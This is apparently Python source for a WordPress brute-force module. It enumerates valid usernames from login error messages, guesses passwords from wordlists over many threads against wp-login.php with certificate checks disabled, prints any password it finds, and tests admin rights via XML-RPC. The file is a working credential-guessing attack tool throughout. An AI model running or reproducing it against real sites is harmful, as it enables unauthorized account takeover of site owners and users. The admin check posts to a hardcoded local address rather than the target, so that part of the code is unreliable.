import requests
import os
from engine.core import *
from engine.wordpress import *
from engine.thread_engine import ThreadEngine


class Brute_Engine:
    def __init__(self, wordpress, brute, usernames, users_list, passwords_list):
        if brute:
            if usernames:
                users_to_brute = [user.strip() for user in usernames.split(',')]
                for user in users_to_brute:
                    print(notice("Bruteforcing " + user))
                    self.bruteforcing_pass(wordpress, user, passwords_list)

            elif users_list:
                if not os.path.isfile(users_list) or not os.path.isfile(passwords_list):
                    print(critical("Can't find users list or passwords list file"))
                    exit()

                print(notice("Bruteforcing users from the list"))
                self.bruteforcing_users(wordpress, users_list, passwords_list)

            elif wordpress.users:
                if not os.path.isfile(passwords_list):
                    print(critical("Can't find passwords list file"))
                    exit()

                print(notice("Bruteforcing detected users:"))
                for user in wordpress.users:
                    print(info("User found: " + user['slug']))
                    self.bruteforcing_pass(wordpress, user['slug'], passwords_list)

    def bruteforcing_users(self, wordpress, users_list, passwords_list):
        with open(users_list) as users_file:
            users = [user.strip() for user in users_file.readlines()]

        thread_engine = ThreadEngine(wordpress.max_threads)
        users_found = []

        for user in users:
            thread_engine.new_task(self.check_user, (user, users_found, wordpress))
        thread_engine.wait()

        for user in users_found:
            self.bruteforcing_pass(wordpress, user, passwords_list)

    def check_user(self, user, users_found, wordpress):
        data = {"log": user, "pwd": "wordpresscan"}
        while True:
            try:
                html = requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text
            except requests.exceptions.RequestException:
                print(critical('ConnectionError in thread, retry...'))
                continue
            break

        if '<div id="login_error">' in html and '<strong>%s</strong>' % user in html:
            print(info("User found: " + user))
            users_found.append(user)

    def bruteforcing_pass(self, wordpress, user, passwords_list):
        print(info("Starting password bruteforce for " + user))

        with open(passwords_list) as passwords_file:
            passwords = [pwd.strip() for pwd in passwords_file.readlines()]

        thread_engine = ThreadEngine(wordpress.max_threads)
        found = [False]

        for pwd in passwords:
            if found[0]:
                break
            thread_engine.new_task(self.check_pass, (user, pwd, wordpress, found))
        thread_engine.wait()

    def check_pass(self, user, pwd, wordpress, found):
        data = {"log": user, "pwd": pwd}
        while True:
            try:
                html = requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text
            except requests.exceptions.RequestException:
                print(critical('ConnectionError in thread, retry...'))
                continue
            break

        if '<div id="login_error">' not in html:
            print(warning("Password found for {}: {}".format(user, pwd).ljust(100)))
            found[0] = True

            self.xmlrpc_check_admin(user, pwd)

    def xmlrpc_check_admin(self, username, password):
        post = (
            "<methodCall>"
            "<methodName>wp.getUsersBlogs</methodName>"
            "<params>"
            "<param><value><string>{}</string></value></param>"
            "<param><value><string>{}</string></value></param>"
            "</params>"
            "</methodCall>"
        ).format(username, password)

        req = requests.post("http://127.0.0.1:8000/xmlrpc.php", data=post)
        regex = re.compile("isAdmin.*boolean.(\d)")
        match = regex.findall(req.text)
        if int(match[0]):
            print(critical("User is an admin!"))
